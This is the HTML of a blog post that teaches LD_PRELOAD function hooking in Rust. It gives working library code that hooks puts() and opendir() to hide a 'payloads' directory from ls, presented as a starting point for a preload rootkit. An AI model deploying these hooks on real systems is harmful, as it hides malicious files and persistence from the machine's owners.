@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>hooking libc 4 fun (in rust) | (ง︡&#39;-&#39;︠)ง</title>
+<meta name="keywords" content="libc, hooking-libc, rust">
+<meta name="description" content="libc and rusty rootkits">
+<meta name="author" content="ziggoon">
+<link rel="canonical" href="https://canonical.url/to/page">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://192.168.69.101:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://192.168.69.101:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://192.168.69.101:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://192.168.69.101:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://192.168.69.101:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://192.168.69.101:1313/posts/hooking-libc/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://192.168.69.101:1313/" accesskey="h" title="(ง︡&#39;-&#39;︠)ง (Alt + H)">(ง︡&#39;-&#39;︠)ง</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://192.168.69.101:1313/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://192.168.69.101:1313/tags" title="tags">
+                    <span>tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://192.168.69.101:1313/">home</a>&nbsp;»&nbsp;<a href="http://192.168.69.101:1313/posts/">posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      hooking libc 4 fun (in rust)
+    </h1>
+    <div class="post-description">
+      libc and rusty rootkits
+    </div>
+    <div class="post-meta"><span title='2024-04-07 00:00:00 +0000 UTC'>April 7, 2024</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1729 words&nbsp;·&nbsp;ziggoon
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="libc">libc<a hidden class="anchor" aria-hidden="true" href="#libc">#</a></h2>
+<blockquote>
+<p>when writing C access to libc is extremely straightforward. include the relevant header files in your source files and voila, you are in the world of libc.</p>
+</blockquote>
+<p>libc is the standard library for C that defines types and functions for use in C programs - there&rsquo;s a bunch of techincality about its standards, but thats not important nor do i care. this is generally distributed as a shared library (.so) on linux and loaded using static or dynamic linking. we&rsquo;ll get into that a bit more later.</p>
+<p>let&rsquo;s start with the most basic example, outputting text to a console. in the following code snippet, <code>puts</code> is imported from <code>stdio.h</code> in libc and used to print a string to <code>stdout</code></p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+
+int main() {
+    puts(&#34;hello from C\n&#34;);
+
+    return 0;
+}
+</code></pre><pre tabindex="0"><code>gcc hello.c -o hello; ./hello
+hello from C
+</code></pre><hr>
+<h2 id="libc-in-rust">libc in rust?<a hidden class="anchor" aria-hidden="true" href="#libc-in-rust">#</a></h2>
+<blockquote>
+<p>rust has its own standard library, why would we need to call libc? to hook functions for <em>fun</em> of course</p>
+</blockquote>
+<p>alright so now that we have a basic idea of how libc is used in C programs, let&rsquo;s take a look at what printing a string looks like using rust and its standard library. instead of including a header file, we can utilize the <code>println!</code> macro which is a default feature of the rust standard library.</p>
+<pre tabindex="0"><code>fn main() {
+    println!(&#34;hello from rust&#34;);
+}
+</code></pre><pre tabindex="0"><code>cargo run
+   Compiling blog_ex v0.1.0 (/home/kali/blog_ex)
+    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.69s
+     Running `target/debug/blog_ex`
+hello from rust
+</code></pre><p>fun stuff, but not what we are here for. how can we call libc from rust? rust provides an interface for calling functions defined in other languages known as the <a href="https://doc.rust-lang.org/nomicon/ffi.html">foreign function interface (FFI)</a>. thankfully, there is a <code>libc</code> crate which provides bindings that we can use :)</p>
+<p>using the <code>libc</code> crate, let&rsquo;s start by replicating our C example using libc instead of rust&rsquo;s standard lib.</p>
+<ol>
+<li>
+<p>create a new crate:
+<code>cargo new libc_ex --bin</code></p>
+</li>
+<li>
+<p>add libc to dependencies:
+<code>cargo add libc</code></p>
+</li>
+<li>
+<p>modify <code>main.rs</code></p>
+</li>
+</ol>
+<pre tabindex="0"><code>use std::ffi::CString;
+use std::os::raw::c_char;
+
+extern &#34;C&#34; {
+    fn puts(s: *const c_char) -&gt; i32;
+}
+
+fn main() {
+    let message = CString::new(&#34;hello from rust&#34;).unwrap();
+
+    unsafe {
+        puts(message.as_ptr());
+    }
+}
+</code></pre><pre tabindex="0"><code>cargo run
+   Compiling libc v0.2.153
+   Compiling libc_ex v0.1.0 (/home/kali/libc_ex)
+    Finished `dev` profile [unoptimized + debuginfo] target(s) in 2.48s
+     Running `target/debug/libc_ex`
+hello from rust
+</code></pre><p><code>puts()</code> was successfuly called from rust ٩(˘◡˘)۶ let&rsquo;s review what we just wrote before moving onto better things.</p>
+<p>starting from the top, we imported the necessary C types, defined the function signature for <code>puts()</code> which will be used when cargo links the program against libc, defined the string to print, then called <code>puts()</code> with our defined string as an arg.</p>
+<p>when we compile this program, the signature we created for <code>puts()</code> will be compiled into LLVM IR and linked against libc due to the <code>extern &quot;C&quot;</code> block. technically, the <code>&quot;C&quot;</code> part isn&rsquo;t necessary, but it forces the function to follow the C calling convention. lastly, all calls to libc functions (all foreign functions tbh) have to be wrapped in an <code>unsafe{}</code> block due to the fact they often violate the guarentees of rust&rsquo;s safety</p>
+<h2 id="linking">linking?<a hidden class="anchor" aria-hidden="true" href="#linking">#</a></h2>
+<p>as mentioned earlier, libc is distributed as a shared library on linux and linked staticly or dynamically into programs. so what is the difference between static and dynamic linking?</p>
+<h3 id="static-linking">static linking<a hidden class="anchor" aria-hidden="true" href="#static-linking">#</a></h3>
+<p>static linking occurs during compilation time and loads the necessary library functions directly into the executable binary. for example, if we staticly linked the C program with the <code>puts()</code> example from earlier, <code>gcc</code> would compile the definitions straight into the binary.</p>
+<h3 id="dynamic-linking">dynamic linking<a hidden class="anchor" aria-hidden="true" href="#dynamic-linking">#</a></h3>
+<p>dynamic linking occurs during runtime and is performed by <code>ld-linux</code> which is the dynamic linker and loader for linux. taking a look at our C program, we can verify that is is dynamically linked using <code>/lib64/ld-linux-x86-64.so.2</code></p>
+<pre tabindex="0"><code>hello: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4d6039bfcd77526e59344f97ac121a233b8ecae8, for GNU/Linux 3.2.0, not stripped
+</code></pre><p><code>ld-linux.so</code> aka <code>ld.so</code> is pretty based when you leverage it properly. let&rsquo;s take a look at the <a href="https://www.man7.org/linux/man-pages/man8/ld.so.8.html">man page</a> for <code>ld.so</code></p>
+<pre tabindex="0"><code>There are various methods of specifying libraries to be 
+preloaded, and these are handled in the following order:
+        (1)  The LD_PRELOAD environment variable.
+
+        (2)  The --preload command-line option when invoking the
+                   dynamic linker directly.
+
+        (3)  The /etc/ld.so.preload file (described below).
+</code></pre><p>✨(っ◔︣◡◔᷅)っ <strong>/etc/ld.so.preload</strong> c(◕︣◡◕᷅c)✨</p>
+<h2 id="dynamic-linker-abuse">dynamic linker abuse?<a hidden class="anchor" aria-hidden="true" href="#dynamic-linker-abuse">#</a></h2>
+<p>dynamically linked binaries will link against the libraries they utilize (like libc), but what happens if we provide a function definition that gets linked before the default linker? this is commonly known as <em>function hooking</em></p>
+<p>ok, so we want to hook a function. we&rsquo;ll need a definition for a function that is compiled into a shared library. let&rsquo;s continue using <code>puts()</code> as an example - we&rsquo;ll hook <code>puts()</code> to always print <code>hooked puts()</code></p>
+<p>let&rsquo;s start building a library for this.</p>
+<ol>
+<li>
+<p>create new crate:
+<code>cargo new hooked_puts --lib</code></p>
+</li>
+<li>
+<p>add libc to dependencies:
+<code>cargo add libc</code></p>
+</li>
+<li>
+<p>set library type to <code>dylib</code> (dynamic library) in <code>Cargo.toml</code></p>
+</li>
+</ol>
+<pre tabindex="0"><code>[package]
+name = &#34;hooked_puts&#34;
+version = &#34;0.1.0&#34;
+edition = &#34;2021&#34;
+
+[dependencies]
+libc = &#34;0.2.153&#34;
+
+[lib]
+crate-type = [&#34;dylib&#34;]
+</code></pre><ol start="4">
+<li>at this stage, we can start writing the library code (e.g the <code>puts()</code> definition). it&rsquo;s pretty similar to the code we wrote earlier, except this time we are writing the definition of <code>puts()</code> instead of using it :)</li>
+</ol>
+<p>the code is extremely simple:</p>
+<pre tabindex="0"><code>use std::os::raw::{c_int, c_char};
+
+#[no_mangle]
+pub unsafe extern &#34;C&#34; fn puts(_s: *const c_char) -&gt; c_int {
+    println!(&#34;hooked puts()&#34;);
+
+    return 0;
+}
+</code></pre><p>compile w/ optimizations and hello using LD_PRELOAD and our C program from earlier</p>
+<pre tabindex="0"><code>cargo build --release
+   Compiling libc v0.2.153
+   Compiling hooked_puts v0.1.0 (/home/kali/hooked_puts)
+    Finished `release` profile [optimized] target(s) in 2.26s
+</code></pre><pre tabindex="0"><code>LD_PRELOAD=/home/kali/libhooked_puts.so ./hello
+hooked puts()
+</code></pre><p>(҂◡̀_◡́)ᕤ libc hooked. we are so back (kinda)</p>
+<p>alright, well hooking <code>puts()</code> is cool and all, but it really serves zero purpose for establishing persistence. my inspiration for this research, <a href="https://github.com/mav8557/Father">Father</a>, provides some excellent examples of how to utilize libc hooking for persistence. while i wont cover the full process in this post, the content should get you rolling to build your own rootkit 4 funsiez.</p>
+<h2 id="ls-never-met-her">ls? never met her<a hidden class="anchor" aria-hidden="true" href="#ls-never-met-her">#</a></h2>
+<p>everyone who has ever touched a linux box is familiar with <code>ls</code>. its used to list the contents of a directory, but how? great question reader! it uses libc functions (and syscalls but thats not important rn)</p>
+<p>here is how <code>ls</code> works at a relatively low level:</p>
+<ol>
+<li>open directory using libc&rsquo;s <code>opendir()</code></li>
+<li>read directory entries using libc&rsquo;s <code>readdir()</code></li>
+<li>retrieve file metadata using libc&rsquo;s <code>stat()</code> or <code>lstat()</code> or <code>statx()</code></li>
+<li>print to stdout with libc&rsquo;s <code>write()</code></li>
+</ol>
+<p>nice. we&rsquo;ve already covered how to hook a libc function and return our own data. what if we want to hook the function and perform an action if a condition is met, otherwise execute the original function? we just retrieve the address of the original function and load it into our program during runtime</p>
+<p>let&rsquo;s hop back to our <code>puts()</code> example to hook the function to print <code>no libc 4 u</code> if the string passed to puts matches <code>hello from C</code>.</p>
+<pre tabindex="0"><code>use std::os::raw::{c_int, c_char, c_void};
+use std::ffi::CStr;
+
+#[no_mangle]
+pub unsafe extern &#34;C&#34; fn puts(s: *const c_char) -&gt; c_int {
+    let o_puts: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b&#34;puts\0&#34;.as_ptr() as *const _) };
+    let o_puts: extern &#34;C&#34; fn(*const c_char) -&gt; c_int = unsafe { std::mem::transmute(o_puts) };
+
+    let cstr = unsafe { CStr::from_ptr(s) };
+    if cstr.to_bytes() == &#34;hello from C\n&#34;.as_bytes() {
+        println!(&#34;no libc 4 u&#34;);
+        return 0;
+    }
+
+    return o_puts(s);
+}
+</code></pre><pre tabindex="0"><code>LD_PRELOAD=/home/kali/libhooked_puts.so ./hello
+no libc 4 u
+</code></pre><p>the code is pretty self-explanatory except for the first two lines of the function. simply put, those two lines load the original <code>puts()</code> function from libc into the process address space for usage within our rust program.</p>
+<p>awesome! we&rsquo;ve successfully hooked the <code>puts()</code> function and changed it logic. let&rsquo;s verify that our code still calls the original function properly. lets change the string in the C source file, compile, then link against our malicious library.</p>
+<pre tabindex="0"><code>gcc hello.c -o hello; ./hello
+hello from C... maybe?
+</code></pre><pre tabindex="0"><code>LD_PRELOAD=/home/kali/libhooked_puts.so ./hello
+hello from C.. maybe?
+</code></pre><p>cool, that works as expected. let&rsquo;s move onto hooking some other functions with a goal of hiding directories and files. as previously mentioned, <code>ls</code> calls multiple libc functions to retrieve information about to contents of a directory. for brevity i will only cover to hooking on <code>opendir()</code> to hide a malicious directory <code>payloads</code></p>
+<p>the example code is almost 1:1 as the <code>puts()</code> example, except we must return a null pointer instead of a <code>c_int</code>. we will also need to utilize the <code>errno</code> crate to set the relevant variable <code>ENOENT</code> which indicates that there is no file or directory. you can add that to the crate using: <code>cargo add errno</code></p>
+<pre tabindex="0"><code>use errno::set_errno;
+#[no_mangle]
+pub extern &#34;C&#34; fn opendir(name: *const c_char) -&gt; *mut FILE {
+    let o_opendir: *mut c_void = unsafe { libc::dlsym(libc::RTLD_NEXT, b&#34;opendir\0&#34;.as_ptr() as *const _) };
+    let o_opendir: extern &#34;C&#34; fn(*const c_char) -&gt; *mut FILE = unsafe { std::mem::transmute(o_opendir) };
+
+    let cstr = unsafe { CStr::from_ptr(name) };
+    if cstr.to_bytes() == &#34;payloads&#34;.as_bytes() {
+        set_errno(errno::Errno(libc::ENOENT));
+        return null_mut()
+    }
+
+    return o_opendir(name);
+}
+</code></pre><p>once we have the library compiled, we can verify the directory <code>payloads</code> exists on the filesystem and is accessible when using <code>ls</code> linked against libc.</p>
+<pre tabindex="0"><code>ls -la payloads
+total 12
+drwxr-xr-x 3 kali kali 4096 Apr  8 12:25 .
+drwxr-xr-x 8 kali kali 4096 Apr  8 12:26 ..
+drwxr-xr-x 2 kali kali 4096 Apr  8 12:25 test
+-rw-r--r-- 1 kali kali    0 Apr  8 12:25 test.c
+</code></pre><p>when running <code>ls</code> linked against our library, <code>payloads</code> is no longer</p>
+<pre tabindex="0"><code>LD_PRELOAD=/home/kali/libhooked_puts.so ls -la payloads
+ls: cannot open directory &#39;payloads&#39;: No such file or directory
+</code></pre><h2 id="moving-further">moving further<a hidden class="anchor" aria-hidden="true" href="#moving-further">#</a></h2>
+<p>malicious function signatures delivered through dynamic preloading allow attackers to enable capabilities such as authentication sniffing, network connection and process masking, and various other techniques. a common technique for establishing persistence utilizing preload rootkits is by hooking <code>accept()</code> to accept connections on an arbitrary port, essentially creating a bind shell. this process is well documented in the this <a href="https://www.secureideas.com/blog/ldpreload-making-a-backdoor-by-hijacking-accept">blog</a>.</p>
+<p>preload rootkits are super extensible depending on the enagement requirements. one public example that illustrates the capabilities of a well-developed rookit is <a href="https://github.com/ldpreload/Medusa">medusa</a>. unfortuantely, using the dynamic loader through <code>LD_PRELOAD</code> or <code>/etc/ld.so.preload</code> as a persistence method is well documented: mitre technique: <code>T1574.006</code></p>
+<p>fortunately, for attackers, preload rootkits are not the only method of deep persistence on linux systems. one of my personal favorite examples that utilizes eBPF, with i would like to explore using <a href="https://github.com/aya-rs/">aya</a>, is <a href="https://github.com/Gui774ume/ebpfkit">epfkit</a>.</p>
+<p>until next time ≧◠‿◠≦✌</p>
+<p>sources: <br>
+<a href="https://doc.rust-lang.org/nomicon/ffi.html">https://doc.rust-lang.org/nomicon/ffi.html</a></p>
+<p><a href="https://www.man7.org/linux/man-pages/man8/ld.so.8.html">https://www.man7.org/linux/man-pages/man8/ld.so.8.html</a></p>
+<p><a href="https://www.secureideas.com/blog/ldpreload-making-a-backdoor-by-hijacking-accept">https://www.secureideas.com/blog/ldpreload-making-a-backdoor-by-hijacking-accept</a></p>
+<p><a href="https://attack.mitre.org/techniques/T1574/006/">https://attack.mitre.org/techniques/T1574/006/</a></p>
+<p><a href="https://github.com/mav8557/Father">https://github.com/mav8557/Father</a></p>
+<p><a href="https://github.com/ldpreload/Medusa">https://github.com/ldpreload/Medusa</a></p>
+<p><a href="https://github.com/Gui774ume/ebpfkit">https://github.com/Gui774ume/ebpfkit</a></p>
+<p><a href="https://github.com/aya-rs/">https://github.com/aya-rs/</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://192.168.69.101:1313/tags/libc/">libc</a></li>
+      <li><a href="http://192.168.69.101:1313/tags/hooking-libc/">hooking-libc</a></li>
+      <li><a href="http://192.168.69.101:1313/tags/rust/">rust</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://192.168.69.101:1313/">(ง︡&#39;-&#39;︠)ง</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
